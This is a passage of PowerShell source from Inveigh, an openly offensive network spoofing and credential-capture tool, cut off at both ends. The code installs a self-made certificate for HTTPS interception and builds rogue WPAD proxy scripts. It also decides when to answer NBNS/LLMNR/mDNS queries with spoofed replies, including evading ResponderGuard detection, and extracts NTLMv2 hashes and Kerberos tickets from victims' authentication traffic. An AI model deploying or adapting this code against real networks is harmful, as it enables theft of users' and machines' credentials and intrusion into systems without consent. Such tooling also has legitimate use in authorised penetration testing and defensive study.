$certificate_issuer_distinguished_name = new-object -com \"X509Enrollment.CX500DistinguishedName\"\n                $certificate_issuer_distinguished_name.Encode(\"CN=\" + $inveigh.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)\n                $certificate_key = new-object -com \"X509Enrollment.CX509PrivateKey\"\n                $certificate_key.ProviderName = \"Microsoft Enhanced RSA and AES Cryptographic Provider\"\n                $certificate_key.KeySpec = 2\n                $certificate_key.Length = 2048\n\t\t\t    $certificate_key.MachineContext = 1\n                $certificate_key.Create()\n                $certificate_server_auth_OID = new-object -com \"X509Enrollment.CObjectId\"\n\t\t\t    $certificate_server_auth_OID.InitializeFromValue(\"1.3.6.1.5.5.7.3.1\")\n\t\t\t    $certificate_enhanced_key_usage_OID = new-object -com \"X509Enrollment.CObjectIds.1\"\n\t\t\t    $certificate_enhanced_key_usage_OID.Add($certificate_server_auth_OID)\n\t\t\t    $certificate_enhanced_key_usage_extension = new-object -com \"X509Enrollment.CX509ExtensionEnhancedKeyUsage\"\n\t\t\t    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)\n\t\t\t    $certificate = new-object -com \"X509Enrollment.CX509CertificateRequestCertificate\"\n\t\t\t    $certificate.InitializeFromPrivateKey(2,$certificate_key,\"\")\n\t\t\t    $certificate.Subject = $certificate_distinguished_name\n\t\t\t    $certificate.Issuer = $certificate_issuer_distinguished_name\n\t\t\t    $certificate.NotBefore = (Get-Date).AddDays(-271)\n\t\t\t    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)\n\t\t\t    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId\n\t\t\t    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,\"SHA256\")\n\t\t\t    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID\n                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)\n                $certificate_basic_constraints = new-object -com \"X509Enrollment.CX509ExtensionBasicConstraints\"\n\t\t\t    $certificate_basic_constraints.InitializeEncode(\"true\",1)\n                $certificate.X509Extensions.Add($certificate_basic_constraints)\n                $certificate.Encode()\n                $certificate_enrollment = new-object -com \"X509Enrollment.CX509Enrollment\"\n\t\t\t    $certificate_enrollment.InitializeFromRequest($certificate)\n\t\t\t    $certificate_data = $certificate_enrollment.CreateRequest(0)\n                $certificate_enrollment.InstallResponse(2,$certificate_data,0,\"\")\n                $inveigh.certificate = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})\n            }\n            else\n            {\n                \n                if($HTTPSForceCertDelete -eq 'Y')\n                {\n                    $inveigh.HTTPS_force_certificate_delete = $true\n                }\n\n                $inveigh.HTTPS_existing_certificate = $true\n                $inveigh.output_queue.Add(\"[+] HTTPS Capture = Using Existing Certificate\")  > $null\n            }\n            \n            $inveigh.HTTPS = $true\n\n            if($HTTPIP -ne '0.0.0.0')\n            { \n                $inveigh.output_queue.Add(\"[+] HTTPS IP = $HTTPIP\") > $null\n            }\n\n            if($HTTPSPort -ne 443)\n            {   \n                $inveigh.output_queue.Add(\"[+] HTTPS Port = $HTTPSPort\") > $null\n            }\n\n            $inveigh.output_queue.Add(\"[+] HTTPS Capture = Enabled\")  > $null\n\n        }\n        catch\n        {\n            $HTTPS = \"N\"\n            $inveigh.HTTPS = $false\n            $inveigh.output_queue.Add(\"[-] HTTPS Capture Disabled Due To Certificate Error\")  > $null\n        }\n\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] HTTPS Capture = Disabled\")  > $null\n}\n\nif($HTTP -eq 'Y' -or $HTTPS -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] HTTP/HTTPS Authentication = $HTTPAuth\")  > $null\n\n    if($HTTPDirectory -and !$HTTPResponse)\n    {\n        $inveigh.output_queue.Add(\"[+] HTTP/HTTPS Directory = $HTTPDirectory\")  > $null\n\n        if($HTTPDefaultFile)\n        {\n            $inveigh.output_queue.Add(\"[+] HTTP/HTTPS Default Response File = $HTTPDefaultFile\")  > $null\n        }\n\n        if($HTTPDefaultEXE)\n        {\n            $inveigh.output_queue.Add(\"[+] HTTP/HTTPS Default Response Executable = $HTTPDefaultEXE\")  > $null\n        }\n\n    }\n\n    if($HTTPResponse)\n    {\n        $inveigh.output_queue.Add(\"[+] HTTP/HTTPS Response = Enabled\")  > $null\n    }\n\n    if($HTTPResponse -or $HTTPDirectory -and $HTTPContentType -ne 'html/text')\n    {\n        $inveigh.output_queue.Add(\"[+] HTTP/HTTPS/Proxy Content Type = $HTTPContentType\")  > $null\n    }\n\n    if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')\n    {\n        $inveigh.output_queue.Add(\"[+] Basic Authentication Realm = $HTTPBasicRealm\")  > $null\n    }\n\n    if($WPADDirectHosts)\n    {\n\n        foreach($WPAD_direct_host in $WPADDirectHosts)\n        {\n            $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, \"' + $WPAD_direct_host + '\")) return \"DIRECT\";'\n        }\n\n    }\n\n    if($Proxy -eq 'Y')\n    {\n\n        if($proxy_port_check)\n        {\n            $Proxy = \"N\"\n            $inveigh.output_queue.Add(\"[-] Proxy Capture Disabled Due To In Use Port $ProxyPort\")  > $null\n        }\n        else\n        {\n            $inveigh.output_queue.Add(\"[+] Proxy Capture = Enabled\")  > $null\n            $inveigh.output_queue.Add(\"[+] Proxy Port = $ProxyPort\") > $null\n            $inveigh.output_queue.Add(\"[+] Proxy Authentication = $ProxyAuth\")  > $null\n            $ProxyPortFailover = $ProxyPort + 1\n            $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})\n\n            if($ProxyIgnore.Count -gt 0)\n            {\n                $inveigh.output_queue.Add(\"[+] Proxy Ignore List = \" + ($ProxyIgnore -join \",\"))  > $null\n            }\n\n            if($ProxyIP -eq '0.0.0.0')\n            {\n                $proxy_WPAD_IP = $IP\n            }\n            else\n            {\n                $proxy_WPAD_IP = $ProxyIP\n            }\n\n            if($WPADIP -and $WPADPort)\n            {\n                $WPADResponse = \"function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `\"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $WPADIP`:$WPADPort; DIRECT`\";}\"\n            }\n            else\n            {\n                $WPADResponse = \"function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `\"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_wpad_IP`:$ProxyPortFailover; DIRECT`\";}\"\n            }\n\n        }\n\n    }\n\n    $inveigh.output_queue.Add(\"[+] WPAD Authentication = $WPADAuth\")  > $null\n\n    if($WPADAuth -like \"NTLM*\")\n    {\n        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})\n\n        if($WPADAuthIgnore.Count -gt 0)\n        {\n            $inveigh.output_queue.Add(\"[+] WPAD NTLM Authentication Ignore List = \" + ($WPADAuthIgnore -join \",\"))  > $null\n        }\n\n    }\n\n    if($WPADDirectHosts)\n    {\n        $inveigh.output_queue.Add(\"[+] WPAD Direct Hosts = \" + ($WPADDirectHosts -join \",\"))  > $null\n    }\n\n    if($WPADResponse -and $Proxy -eq 'N')\n    {\n        $inveigh.output_queue.Add(\"[+] WPAD Response = Enabled\")  > $null\n    }\n    elseif($WPADResponse -and $Proxy -eq 'Y')\n    {\n        $inveigh.output_queue.Add(\"[+] WPAD Proxy Response = Enabled\")  > $null\n\n        if($WPADIP -and $WPADPort)\n        {\n            $inveigh.output_queue.Add(\"[+] WPAD Failover = $WPADIP`:$WPADPort\")  > $null\n        }\n\n    }\n    elseif($WPADIP -and $WPADPort)\n    {\n        $inveigh.output_queue.Add(\"[+] WPAD Response = Enabled\")  > $null\n        $inveigh.output_queue.Add(\"[+] WPAD = $WPADIP`:$WPADPort\")  > $null\n        \n        if($WPADDirectHosts)\n        {\n\n            foreach($WPAD_direct_host in $WPADDirectHosts)\n            {\n                $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, \"' + $WPAD_direct_host + '\")) return \"DIRECT\";'\n            }\n\n            $WPADResponse = \"function FindProxyForURL(url,host){\" + $WPAD_direct_hosts_function + \"return `\"PROXY \" + $WPADIP + \":\" + $WPADPort + \"`\";}\"\n            $inveigh.output_queue.Add(\"[+] WPAD Direct Hosts = \" + ($WPADDirectHosts -join \",\"))  > $null\n        }\n        else\n        {\n            $WPADResponse = \"function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `\"PROXY $WPADIP`:$WPADPort; DIRECT`\";}\"\n        }\n\n    }\n\n    if($Challenge)\n    {\n        $inveigh.output_queue.Add(\"[+] HTTP NTLM Challenge = $Challenge\")  > $null\n    }\n\n}\n\nif($Kerberos -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[+] Kerberos TGT Capture = Enabled\")  > $null\n    $inveigh.output_queue.Add(\"[+] Kerberos TGT File Output Count = $KerberosCount\")  > $null\n    \n    if($KerberosHostHeader.Count -gt 0)\n    {\n        $inveigh.output_queue.Add(\"[+] Kerberos TGT Host Header List = \" + ($KerberosHostHeader -join \",\"))  > $null\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] Kerberos TGT Capture = Disabled\")  > $null    \n}\n\nif($MachineAccounts -eq 'N')\n{\n    $inveigh.output_queue.Add(\"[+] Machine Account Capture = Disabled\")  > $null\n    $inveigh.machine_accounts = $false\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] Machine Account Capture = Enabled\")  > $null\n    $inveigh.machine_accounts = $true\n}\n\nif($ConsoleOutput -ne 'N')\n{\n\n    if($ConsoleOutput -ne 'N')\n    {\n\n        if($ConsoleOutput -eq 'Y')\n        {\n            $inveigh.output_queue.Add(\"[+] Console Output = Full\")  > $null\n        }\n        else\n        {\n            $inveigh.output_queue.Add(\"[+] Console Output = $ConsoleOutput\")  > $null\n        }\n\n    }\n\n    $inveigh.console_output = $true\n\n    if($ConsoleStatus -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Console Status = $ConsoleStatus Minute\")  > $null\n    }\n    elseif($ConsoleStatus -gt 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Console Status = $ConsoleStatus Minutes\")  > $null\n    }\n\n}\nelse\n{\n\n    if($inveigh.tool -eq 1)\n    {\n        $inveigh.output_queue.Add(\"[+] Console Output Disabled Due To External Tool Selection\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] Console Output = Disabled\")  > $null\n    }\n\n}\n\nif($ConsoleUnique -eq 'Y')\n{\n    $inveigh.console_unique = $true\n}\nelse\n{\n    $inveigh.console_unique = $false\n}\n\nif($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq 'File' -and ($PcapTCP -or $PcapUDP)))\n{\n    \n    if($FileOutput -eq 'Y')\n    {\n        $inveigh.output_queue.Add(\"[+] File Output = Enabled\")  > $null\n        $inveigh.file_output = $true\n    }\n\n    if($Pcap -eq 'File')\n    {\n        $inveigh.output_queue.Add(\"[+] Pcap Output = File\") > $null\n        \n        if($PcapTCP)\n        {\n            $inveigh.output_queue.Add(\"[+] Pcap TCP Ports = \" + ($PcapTCP -join \",\"))  > $null\n        }\n\n        if($PcapUDP)\n        {\n            $inveigh.output_queue.Add(\"[+] Pcap UDP Ports = \" + ($PcapUDP -join \",\"))  > $null\n        }\n\n    }\n\n    $inveigh.output_queue.Add(\"[+] Output Directory = $output_directory\")  > $null \n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] File Output = Disabled\")  > $null\n}\n\nif($Pcap -eq 'Memory')\n{\n    $inveigh.output_queue.Add(\"[+] Pcap Output = Memory\")\n}\n\nif($FileUnique -eq 'Y')\n{\n    $inveigh.file_unique = $true\n}\nelse\n{\n    $inveigh.file_unique = $false\n}\n\nif($LogOutput -eq 'Y')\n{\n    $inveigh.log_output = $true\n}\nelse\n{\n    $inveigh.log_output = $false\n}\n\nif($RunCount)\n{\n    $inveigh.output_queue.Add(\"[+] Run Count = $RunCount\") > $null\n}\n\nif($RunTime -eq 1)\n{\n    $inveigh.output_queue.Add(\"[+] Run Time = $RunTime Minute\")  > $null\n}\nelseif($RunTime -gt 1)\n{\n    $inveigh.output_queue.Add(\"[+] Run Time = $RunTime Minutes\")  > $null\n}\n\nif($ShowHelp -eq 'Y')\n{\n    $inveigh.output_queue.Add(\"[!] Run Stop-Inveigh to stop\")  > $null\n\n    if($inveigh.console_output)\n    {\n        $inveigh.output_queue.Add(\"[*] Press any key to stop console output\")  > $null\n    }\n\n}\n\nwhile($inveigh.output_queue.Count -gt 0)\n{\n\n    switch -Wildcard ($inveigh.output_queue[0])\n    {\n\n        {$_ -like \"?`[`!`]*\" -or $_ -like \"?`[-`]*\"}\n        {\n\n            if($inveigh.status_output -and $inveigh.output_stream_only)\n            {\n                Write-Output($inveigh.output_queue[0] + $inveigh.newline)\n            }\n            elseif($inveigh.status_output)\n            {\n                Write-Warning($inveigh.output_queue[0])\n            }\n\n            if($inveigh.file_output)\n            {\n                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null\n            }\n\n            if($inveigh.log_output)\n            {\n                $inveigh.log.Add($inveigh.output_queue[0]) > $null\n            }\n\n            $inveigh.output_queue.RemoveAt(0)\n        }\n\n        default\n        {\n\n            if($inveigh.status_output -and $inveigh.output_stream_only)\n            {\n                Write-Output($inveigh.output_queue[0] + $inveigh.newline)\n            }\n            elseif($inveigh.status_output)\n            {\n                Write-Output($inveigh.output_queue[0])\n            }\n\n            if($inveigh.file_output)\n            {\n\n                if ($inveigh.output_queue[0].StartsWith(\"[+] \") -or $inveigh.output_queue[0].StartsWith(\"[*] \"))\n                {\n                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null\n                }\n                else\n                {\n                    $inveigh.log_file_queue.Add(\"[redacted]\") > $null    \n                }\n\n            }\n\n            if($inveigh.log_output)\n            {\n                $inveigh.log.Add($inveigh.output_queue[0]) > $null\n            }\n\n            $inveigh.output_queue.RemoveAt(0)\n        }\n\n    }\n\n}\n\n$inveigh.status_output = $false\n\n#endregion\n#region begin script blocks\n\n# Shared Basic Functions ScriptBlock\n$shared_basic_functions_scriptblock =\n{\n\n    function Get-UInt16DataLength\n    {\n        param ([Int]$Start,[Byte[]]$Data)\n        $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)\n\n        return $data_length\n    }\n\n    function Get-UInt32DataLength\n    {\n        param ([Int]$Start,[Byte[]]$Data)\n\n        $data_length = [System.BitConverter]::ToUInt32($Data[$Start..($Start + 3)],0)\n\n        return $data_length\n    }\n\n    function Convert-DataToString\n    {\n        param ([Int]$Start,[Int]$Length,[Byte[]]$Data)\n\n        $string_data = [System.BitConverter]::ToString($Data[$Start..($Start + $Length - 1)])\n        $string_data = $string_data -replace \"-00\",\"\"\n        $string_data = $string_data.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)\n\n        return $string_extract\n    }\n\n    function Convert-DataToUInt16($field)\n    {\n\t   [Array]::Reverse($field)\n\t   return [System.BitConverter]::ToUInt16($field,0)\n    }\n\n    function Convert-DataToUInt32($field)\n    {\n\t   [Array]::Reverse($field)\n\t   return [System.BitConverter]::ToUInt32($field,0)\n    }\n\n    function Get-SpooferResponseMessage\n    {\n        param ([String]$QueryString,[String]$Type,[String]$mDNSType,[String]$Enabled,[byte]$NBNSType)\n\n        if($QueryString -like \"*.*\")\n        {\n            [Array]$query_split = $QueryString.Split('.')\n            $query_host = $query_split[0]\n        }\n\n        $response_type = \"[+]\"\n\n        if($Inspect)\n        {\n            $response_message = \"[inspect only]\"\n        }\n        elseif($Enabled -eq 'N')\n        {\n            $response_message = \"[spoofer disabled]\"\n        }\n        elseif($SpooferHostsReply -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))\n        {\n            $response_message = \"[$QueryString not on reply list]\"\n        }\n        elseif($SpooferHostsIgnore -contains $QueryString -or $SpooferHostsIgnore -contains $query_host)\n        {\n            $response_message = \"[$QueryString is on ignore list]\"\n        }\n        elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)\n        {\n            $response_message = \"[$source_IP not on reply list]\"\n        }\n        elseif($SpooferIPsIgnore -contains $source_IP)\n        {\n            $response_message = \"[$source_IP is on ignore list]\"\n        }\n        elseif($inveigh.valid_host_list -contains $query_string -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))\n        {\n            $response_message = \"[$query_string is a valid host]\"\n        }\n        elseif($SpooferRepeat -eq 'Y' -and $inveigh.IP_capture_list -contains $source_IP.IPAddressToString)\n        {\n            $response_message = \"[previous $source_IP capture]\"\n        }\n        elseif($Type -eq 'NBNS' -and $source_IP.IPAddressToString -eq $IP)\n        {\n            $response_message = \"[local query]\"\n        }\n        elseif($SpooferLearning -eq 'Y' -or $SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)\n        {\n            $response_message = \": \" + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + \" minute(s) until spoofing starts\"\n        }\n        elseif($Type -eq 'NBNS' -and $NBNSTypes -notcontains $NBNS_query_type)\n        {\n            $response_message = \"[NBNS type disabled]\"\n        }\n        elseif($Type -eq 'NBNS' -and $NBNSType -eq 33)\n        {\n            $response_message = \"[NBSTAT request]\"\n        }\n        elseif($EvadeRG -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $destination_IP.IPAddressToString -eq $IP)\n        {\n            $response_message = \"[possible ResponderGuard request ignored]\"\n            $response_type = \"[!]\"\n        }\n        elseif($Type -eq 'mDNS' -and $mDNSType -and $mDNSTypes -notcontains $mDNSType)\n        {\n            $response_message = \"[mDNS type disabled]\"\n        }\n        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdHost -gt 0 -and @($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -le $SpooferThresholdHost)\n        {\n            $response_message = \"[SpooferThresholdHost >= $(@($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count)]\"\n        }\n        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdNetwork -gt 0 -and @($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count -le $SpooferThresholdNetwork)\n        {\n            $response_message = \"[SpooferThresholdNetwork >= $(@($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count)]\"\n        }\n        elseif($QueryString -match '[^\\x00-\\x7F]+')\n        {\n            $response_message = \"[nonprintable characters]\"\n        }\n        else\n        {\n            $response_message = \"[response sent]\"\n        }\n\n        return $response_type,$response_message\n    }\n\n    function Get-NBNSQueryType([String]$NBNSQueryType)\n    {\n\n        switch ($NBNSQueryType)\n        {\n\n            '41-41'\n            {\n                $NBNS_query_type = \"00\"\n            }\n\n            '41-42'\n            {\n                $NBNS_query_type = \"01\"\n            }\n\n            '41-43'\n            {\n                $NBNS_query_type = \"02\"\n            }\n\n            '41-44'\n            {\n                $NBNS_query_type = \"03\"\n            }\n\n            '43-41'\n            {\n                $NBNS_query_type = \"20\"\n            }\n\n            '42-4C'\n            {\n                $NBNS_query_type = \"1B\"\n            }\n\n            '42-4D'\n            {\n                $NBNS_query_type = \"1C\"\n            }\n\n            '42-4E'\n            {\n                $NBNS_query_type = \"1D\"\n            }\n\n            '42-4F'\n            {\n                $NBNS_query_type = \"1E\"\n            }\n\n        }\n\n        return $NBNS_query_type\n    }\n\n    function Get-NameQueryString([Int]$Index, [Byte[]]$NameQuery)\n    {\n        $segment_length = $NameQuery[12]\n\n        if($segment_length -gt 0)\n        {\n            $i = 0\n            $name_query_string = ''\n\n            do\n            {\n                $name_query_string += [System.Text.Encoding]::UTF8.GetString($NameQuery[($Index + 1)..($Index + $segment_length)])\n                $Index += $segment_length + 1\n                $segment_length = $NameQuery[$Index]\n                $i++\n\n                if($segment_length -gt 0)\n                {\n                    $name_query_string += \".\"\n                }\n\n            }\n            until($segment_length -eq 0 -or $i -eq 127)\n            \n        }\n\n        return $name_query_string\n    }\n\n    function ConvertFrom-PacketOrderedDictionary\n    {\n        param($packet_ordered_dictionary)\n\n        foreach($field in $packet_ordered_dictionary.Values)\n        {\n            $byte_array += $field\n        }\n\n        return $byte_array\n    }\n\n    function New-RelayEnumObject\n    {\n        param ($IP,$Hostname,$Sessions,$AdministratorUsers,$AdministratorGroups,$Privileged,$Shares,$NetSessions,$NetSessionsMapped,\n        $LocalUsers,$SMB2,$Signing,$SMBServer,$Targeted,$Enumerate,$Execute)\n\n        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}\n        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}\n        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}\n        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}\n        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}\n        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}\n        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}\n        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}\n\n        $relay_object = New-Object PSObject\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Index\" $inveigh.enumerate.Count\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"IP\" $IP\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Hostname\" $Hostname\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Sessions\" $Sessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Users\" $AdministratorUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Administrator Groups\" $AdministratorGroups\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Privileged\" $Privileged\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Shares\" $Shares\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions\" $NetSessions\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"NetSessions Mapped\" $NetSessionsMapped\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Local Users\" $LocalUsers\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB2.1\" $SMB2\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Signing\" $Signing\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"SMB Server\" $SMBServer\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Targeted\" $Targeted\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Enumerate\" $Enumeration\n        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name \"Execute\" $Execution\n\n        return $relay_object\n    }\n\n    function Invoke-SessionUpdate\n    {\n        param ([String]$domain,[String]$username,[String]$hostname,[String]$IP)\n\n        if($inveigh.domain_mapping_table.$domain)\n        {\n            $session = ($username + \"@\" + $inveigh.domain_mapping_table.$domain).ToUpper()\n            $hostname_full = ($hostname + \".\" + $inveigh.domain_mapping_table.$domain).ToUpper()\n        }\n        else\n        {\n            $session = $domain + \"\\\" + $username\n        }\n\n        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n        {\n\n            if($inveigh.enumerate[$i].Hostname -eq $hostname_full -or $inveigh.enumerate[$i].IP -eq $IP)\n            {\n\n                if(!$inveigh.enumerate[$i].Hostname)\n                {\n                    $inveigh.enumerate[$target_index].Hostname = $hostname_full\n                }\n\n                [Array]$session_list = $inveigh.enumerate[$i].Sessions\n\n                if($inveigh.domain_mapping_table.$domain)\n                {\n\n                    for($j = 0;$j -lt $session_list.Count;$j++)\n                    {\n\n                        if($session_list[$j] -like \"$domain\\*\")\n                        {\n                            $session_username = ($session_list[$j].Split(\"\\\"))[1]\n                            $session_update = $session_username + \"@\" + $inveigh.domain_mapping_table.$domain\n                            $session_list[$j] += $session_update\n                            $inveigh.enumerate[$i].Sessions = $session_list\n                        }\n\n                    }\n\n                }\n\n                if($session_list -notcontains $session)\n                {\n                    $session_list += $session\n                    $inveigh.enumerate[$i].Sessions = $session_list\n                }\n\n                $target_updated = $true\n                break\n            }\n\n        }\n     \n        if(!$target_updated)\n        {\n            $inveigh.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) > $null\n        }\n\n    }\n\n    \n\n}\n\n# NTLM_functions_scriptblock\n$NTLM_functions_scriptblock =\n{\n\n    function Get-NTLMResponse\n    {\n        param ([Byte[]]$Payload,[String]$Capture,[String]$SourceIP,[String]$SourcePort,[String]$Port,[String]$Protocol)\n\n        $payload_converted = [System.BitConverter]::ToString($Payload)\n        $payload_converted = $payload_converted -replace \"-\",\"\"\n        $NTLMSSP_hex_offset = $payload_converted.IndexOf(\"4E544C4D53535000\")\n        $session = \"$SourceIP`:$SourcePort\"\n\n        if($NTLMSSP_hex_offset -ge 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq \"03000000\")\n        {\n            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2\n            $LM_length = Get-UInt16DataLength ($NTLMSSP_offset + 12) $Payload\n            $LM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 16) $Payload\n            $LM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace \"-\",\"\"\n            $NTLM_length = Get-UInt16DataLength ($NTLMSSP_offset + 20) $Payload\n            $NTLM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 24) $Payload\n            $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace \"-\",\"\"\n            $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload\n            $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload\n\n            if($domain_length -gt 0)\n            {\n                $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload\n            }\n\n            $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload\n            $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload\n            $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload\n            $host_length = Get-UInt16DataLength ($NTLMSSP_offset + 44) $Payload\n            $host_offset = Get-UInt32DataLength ($NTLMSSP_offset + 48) $Payload\n            $NTLM_host_string = Convert-DataToString ($NTLMSSP_offset + $host_offset) $host_length $Payload\n\n            if($Protocol -eq \"SMB\")\n            {\n                $NTLM_challenge = $inveigh.SMB_session_table.$session\n            }\n            else\n            {\n                $NTLM_challenge = $inveigh.HTTP_session_table.$session\n            }\n            \n            if($NTLM_length -gt 24)\n            {\n\n                if($NTLM_challenge)\n                {\n\n                    $NTLMv2_response = $NTLM_response.Insert(32,':')\n                    $NTLMv2_hash = $NTLM_user_string + \"::\" + $NTLM_domain_string + \":\" + $NTLM_challenge + \":\" + $NTLMv2_response\n\n                    if($Capture -eq 'Y')\n                    {\n\n                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))\n                        {\n                            $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null\n\n                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\"))\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:\") > $null\n                                $inveigh.output_queue.Add($NTLMv2_hash) > $null\n                            }\n                            else\n                            {\n                                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]\") > $null\n                            }\n\n                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\")))\n                            {\n                                $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null\n                                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to \" + \"Inveigh-NTLMv2.txt\") > $null\n                            }\n\n                            if($inveigh.NTLMv2_username_list -notcontains \"$SourceIP $NTLM_domain_string\\$NTLM_user_string\")\n                            {\n                                $inveigh.NTLMv2_username_list.Add(\"$SourceIP $NTLM_domain_string\\$NTLM_user_string\") > $null\n                            }\n\n                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)\n                            {\n                                $inveigh.IP_capture_list.Add($SourceIP) > $null\n                            }\n\n                        }\n                        else\n                        {\n                            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]\") > $null    \n                        